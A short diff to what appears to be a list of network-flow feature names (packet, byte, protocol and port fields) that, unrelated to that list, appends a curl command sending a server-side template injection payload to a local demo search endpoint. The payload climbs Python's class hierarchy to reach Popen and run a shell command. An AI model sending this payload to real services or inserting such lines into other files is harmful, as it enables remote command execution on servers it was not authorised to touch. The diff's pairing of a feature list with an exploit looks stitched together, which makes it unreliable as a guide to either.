@@ -8,3 +8,6 @@ dst2src_packets
 dst2src_bytes
 protocol
 dst_port
+
+
+curl -sG "http://localhost:8000/demo/search"     --data-urlencode "q={% for c in ''.__class__.__mro__[1].__subclasses__() %}{% if 'Popen' in c.__name__ %}{{c('ls',shell=True,stdout=-1).communicate()}}{% endif %}{% endfor %}"
